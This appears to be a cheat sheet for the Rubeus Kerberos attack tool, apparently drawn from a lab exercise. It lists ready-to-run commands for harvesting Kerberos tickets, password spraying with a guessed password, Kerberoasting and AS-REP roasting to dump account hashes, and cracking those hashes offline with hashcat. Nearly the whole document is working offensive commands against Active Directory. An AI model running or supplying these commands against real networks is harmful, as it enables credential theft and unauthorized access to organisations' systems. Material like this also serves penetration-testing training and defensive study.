Rubeus - Tool for attacking Kerberos
Source: https://github.com/GhostPack/Rubeus

Harvesting Tickets:
  Rubeus.exe harvest /interval:30
                        Tells Rubeus to harvest for TGTs every 30 seconds

Brute-Forcing & Password-Spraying:
  echo 10.10.165.34 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
                        Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file
  Rubeus.exe brute /password:Password1 /noticket
                        
Kerberoasting:
  Rubeus.exe kerberoast
                        Dump the Kerberos hash of any kerberoastable users
  hashcat -m 13100 -a 0 hash.txt Pass.txt
                        Crack that hash

AS-REP Roasting:
  Rubeus.exe asreproast
                        Run the AS-REP roast command looking for vulnerable users
                        and then dump found vulnerable user hashes
  hashcat -m 18200 hash.txt <WORDLIST_TXT>
                        Crack those hashes (Kerberos 5 AS-REP etype 23)

Options:

Informational:
  Be mindful of how you use this attack as it may lock you out of the network
  depending on the account lockout policies
